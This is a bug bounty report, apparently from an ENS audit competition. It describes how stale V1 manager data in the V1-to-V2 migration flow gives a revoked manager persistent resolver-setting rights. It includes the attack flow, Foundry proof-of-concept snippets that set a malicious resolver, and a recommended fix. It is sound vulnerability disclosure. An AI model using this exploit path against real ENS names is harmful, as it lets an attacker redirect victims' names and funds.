# 90239 w a medium revoked v1 managers regain persistent v2 resolver control due to stale manager state during migration

**Submitted on Aug 23rd 2026 at 23:00:08 UTC by @Subm4rin3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90239
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Summary

The V1-to-V2 migration flow restores legacy manager permissions using manager information derived from V1 subgraph data without validating that the manager is still authorized in the live V1 ENS Registry.

For an unwrapped `.eth` name, the migration code interprets a difference between the V1 `registrant` and `domain.owner` as an existing manager relationship and stores `domain.owner` as the manager to restore.

This becomes security-critical when the indexed or cached V1 state is stale.

A user may revoke a former manager by reclaiming the V1 registry node, so that the current on-chain state is:

```
BaseRegistrar.ownerOf(tokenId) = victim
ENSRegistry.owner(node)        = victim
former manager                 = no longer authorized
```

However, if the migration application still holds an older V1 snapshot where:

```
registrant   = victim
domain.owner = formerManager
```

the former manager is still classified as an active manager.

Before migration submission, the application revalidates migration-related ownership/approval requirements, but it does not re-read and compare the current V1 `ENSRegistry.owner(node)` against the manager stored in the classified migration state.

The stale manager address is therefore reused when the migration batch is rebuilt.

The resulting owner-authorized HCA batch contains both the migration itself and a call equivalent to:

```solidity
ETHRegistry.grantRoles(
    resource,
    ROLE_SET_RESOLVER,
    formerManager
);
```

As a result, an address whose V1 manager authority was explicitly revoked can receive a fresh and persistent `ROLE_SET_RESOLVER` permission in V2 through the victim's own migration transaction.

After migration, cleanup only removes the HCA's temporary operator approval. It does not revoke the restored manager role.

The former manager can therefore directly call the V2 registry's `setResolver` function and replace the authoritative resolver for the victim-owned ENS name without the V2 owner's permission.

## Root Cause

The root cause is that security-sensitive V2 manager authority is derived from stale off-chain V1 state rather than being bound to the authoritative live V1 registry state at migration time.

The vulnerable flow is conceptually:

```
V1 subgraph / cached domain state
        ↓
domain.owner != domain.registrant
        ↓
managerAddress = domain.owner
        ↓
migration plan / ClassifiedName
        ↓
batch rebuilt without live V1 manager validation
        ↓
grantRoles(..., ROLE_SET_RESOLVER, managerAddress)
```

The migration helper validates the current registrar owner and relevant approvals, but the manager restoration path does not verify that the proposed manager still owns or controls the V1 registry node.

Therefore, revoking the manager in V1 does not guarantee that the revoked authority will remain revoked after migration.

## Attack Preconditions

The attacker only needs to have previously been the legitimate V1 registry owner/manager of the victim's unwrapped `.eth` name.

The attacker does not need:

* the victim's private key;
* control of the victim's HCA;
* a compromised session key;
* a malicious RPC;
* a chain mismatch;
* developer-only API access.

The victim must subsequently revoke the former manager in V1 and perform the normal V1-to-V2 migration while the application is still using stale V1 manager state.

## Attack Flow

1. The victim owns an unwrapped `.eth` name.
2. At some earlier point, the attacker is legitimately configured as the V1 registry owner/manager.
3. The victim revokes the attacker by reclaiming the V1 registry node.
4. The live V1 state now identifies the victim as both the registrar owner and registry owner. The former manager can no longer modify the resolver.
5. The subgraph or client-side migration snapshot still reports the former manager as `domain.owner`.
6. The victim opens or continues the normal migration flow.
7. The migration application classifies the stale `domain.owner` as an existing manager.
8. The application does not revalidate that manager against the current V1 `ENSRegistry.owner(node)` before submission.
9. The victim approves the normal migration/HCA flow.
10. The generated HCA batch migrates the name and grants:

```
ROLE_SET_RESOLVER → formerManager
```

11. Migration succeeds and the victim remains the V2 owner.
12. Cleanup revokes only the HCA's operator approval. The former manager's direct role remains active.
13. The former manager directly calls the V2 registry's `setResolver`.
14. The attacker-controlled resolver becomes authoritative for the victim's ENS name.

## Impact

This allows a revoked former V1 manager to regain persistent unauthorized resolver authority over a victim-owned ENS name during the official Manager migration flow.

The attacker can replace the authoritative resolver without being the V2 owner.

This allows the attacker to redirect resolution of the victim's ENS name to attacker-controlled records. For example, address records may be changed so that assets or interactions intended for the victim are directed to attacker-controlled addresses.

The primary impact is therefore unauthorized hijacking of the resolver of a victim-owned ENS name during V1-to-V2 migration.

This does not require takeover of the HCA or compromise of any current victim credential.

The permission is also persistent: normal migration cleanup removes the HCA operator approval but does not remove the resurrected `ROLE_SET_RESOLVER` role.

## Why the Existing Checks Do Not Prevent the Attack

The current checks validate the live registrar owner and migration/operator approvals, but those checks are insufficient because the security-sensitive value being restored is the V1 registry manager.

The migration path does not validate that:

```
classified.managerAddress == current ENSRegistry.owner(node)
```

before using the classified manager to construct the V2 role grant.

Rebuilding the migration batch immediately before submission does not resolve the issue because the batch builder receives the already-classified V1 objects and does not independently fetch the authoritative manager.

Post-migration verification also does not detect the problem. The verification expectations are generated from the same stale manager state and therefore treat the revoked manager possessing `ROLE_SET_RESOLVER` as the expected successful post-state.

## Stale-State Window

The exploitability is not limited to a fixed five-minute period.

There are two separate stale-state sources:

1. V1 subgraph indexing delay; and
2. the client-side snapshot/cache used by the migration flow.

The five-minute freshness setting only determines when the data becomes eligible for refetch. It does not guarantee that a fresh manager value is fetched before migration submission.

An already-mounted migration flow may therefore continue using the stale domain objects beyond that period.

The security condition is simply:

```
indexed/cached manager != live V1 registry manager
```

at the point where the migration plan is constructed.

## Recommended Fix

Manager restoration should be bound to authoritative live V1 registry state.

At minimum, the application should re-read the current V1 `ENSRegistry.owner(node)` immediately before building/submitting the migration batch and invalidate the migration preview if it differs from the previously classified manager.

However, this still leaves a read-to-execution race.

A stronger fix is to validate or derive the manager atomically as part of the migration's on-chain execution, so that a role can only be restored if the corresponding manager is still authorized in V1 at the time the migration state transition occurs.

Post-migration verification should also derive its expectations from authoritative state rather than from the same stale migration input that generated the role grant.

## Link to Proof of Concept

<https://gist.github.com/5ubm4rin3/f0411b651b8b9ea35d482ea6964d7651>

## Proof of Concept

## Proof of Concept

I reproduced the issue at both the application layer and the contract execution layer.

The contract PoC executes the full exploit against the V1 contracts and the V2 migration/registry/HCA stack.

### 1. Establish a legitimate former V1 manager

Register an unwrapped `.eth` name owned by the victim and set the V1 registry owner to `formerManager`.

```solidity
vm.prank(testOwner);
registryV1.setOwner(node, formerManager);

assertEq(registryV1.owner(node), formerManager);
```

At this point, the former manager is legitimately authorized.

### 2. Revoke the former manager using V1 reclaim

The victim reclaims the registry node:

```solidity
vm.prank(testOwner);
baseRegistrar.reclaim(tokenId, testOwner);
```

The live state is then checked:

```solidity
assertEq(baseRegistrar.ownerOf(tokenId), testOwner);
assertEq(registryV1.owner(node), testOwner);
assertFalse(registryV1.isApprovedForAll(testOwner, formerManager));
```

The former manager is no longer authorized.

To prove this is a real revocation rather than only a state-display difference, the former manager attempts to change the V1 resolver:

```solidity
vm.expectRevert();
vm.prank(formerManager);
registryV1.setResolver(node, maliciousResolver);
```

The call reverts.

Therefore, immediately before migration:

```
registrar owner = victim
registry owner  = victim
former manager  = revoked
```

### 3. Give the migration components the normal approvals

The victim grants the approvals used by the migration flow:

```solidity
vm.startPrank(testOwner);

baseRegistrar.setApprovalForAll(address(helper), true);
ethRegistry.setApprovalForAll(address(hca), true);

vm.stopPrank();
```

No permission is granted directly to `formerManager`.

### 4. Execute the migration batch containing the stale manager restoration

The batch contains two operations.

First, the legitimate migration:

```solidity
Execution({
    target: address(helper),
    value: 0,
    callData: abi.encodeCall(
        MigrationHelper.migrate,
        (unwrapped, noGroups, noGroups, noChildren)
    )
})
```

Second, the role restoration that the application creates from the stale manager:

```solidity
Execution({
    target: address(ethRegistry),
    value: 0,
    callData: abi.encodeCall(
        ethRegistry.grantRoles,
        (
            resource,
            RegistryRolesLib.ROLE_SET_RESOLVER,
            formerManager
        )
    )
})
```

The victim executes the batch through the production owner-only HCA entry point:

```solidity
vm.prank(testOwner);
hca.executeByOwner(executions);
```

The migration succeeds and the victim remains the V2 owner:

```solidity
assertEq(
    ethRegistry.ownerOf(ethRegistry.getTokenId(resource)),
    testOwner
);
```

However, the revoked former manager has now received fresh V2 resolver authority:

```solidity
assertTrue(
    ethRegistry.hasRoles(
        resource,
        RegistryRolesLib.ROLE_SET_RESOLVER,
        formerManager
    )
);
```

### 5. Perform normal migration cleanup

The temporary HCA operator approval is revoked:

```solidity
vm.prank(testOwner);
ethRegistry.setApprovalForAll(address(hca), false);
```

The HCA approval is successfully removed:

```solidity
assertFalse(
    ethRegistry.isApprovedForAll(testOwner, address(hca))
);
```

However, the former manager's direct role remains:

```solidity
assertTrue(
    ethRegistry.hasRoles(
        resource,
        RegistryRolesLib.ROLE_SET_RESOLVER,
        formerManager
    )
);
```

This proves that the unauthorized permission is persistent and is not removed by migration cleanup.

### 6. Exploit the restored resolver permission

The former manager now uses only their own EOA and directly changes the V2 resolver:

```solidity
vm.prank(formerManager);
ethRegistry.setResolver(resource, maliciousResolver);
```

The call succeeds:

```solidity
assertEq(
    ethRegistry.getResolver(testLabel),
    maliciousResolver
);
```

The same account that was unable to change the resolver immediately before migration can therefore change the authoritative resolver immediately after the victim completes migration.

The complete state transition is:

```
V1:

formerManager = authorized
        ↓
victim reclaim()
        ↓
formerManager = revoked
        ↓
formerManager.setResolver()
        → REVERT

Migration:

victim executes normal HCA migration
        ↓
stale formerManager is granted ROLE_SET_RESOLVER
        ↓
HCA operator approval is removed

V2:

formerManager still has ROLE_SET_RESOLVER
        ↓
formerManager.setResolver(maliciousResolver)
        → SUCCESS
```

### 7. Application-level reproduction

I also reproduced the vulnerable behavior using the production migration batch builder.

The application-level test constructs a `ClassifiedName` containing the stale former-manager address and invokes the same `buildAtomicMigrationBatches()` primitive used by the migration flow before submission.

The generated outer transaction is decoded and confirmed to call:

```
HCA.executeByOwner(...)
```

The nested executions contain:

```
ETHRegistry.grantRoles(
    canonicalNameResource,
    ROLE_SET_RESOLVER,
    formerManager
)
```

The test additionally confirms that post-state verification contains a `manager-role` expectation for the same former manager.

Therefore:

* the application really generates the stale manager role grant;
* the exact contracts accept and persist the grant;
* normal cleanup does not remove it;
* the revoked manager can actually use the restored role to change the resolver.

### 8. Execution Result

The Foundry exploit test completes successfully:

```
[PASS] test_revokedV1ManagerIsRestoredAndChangesV2Resolver()
1 passed; 0 failed
```

The application-level regression PoC also passes.

This demonstrates the complete exploit path rather than only showing malformed calldata or a hypothetical stale-state condition.
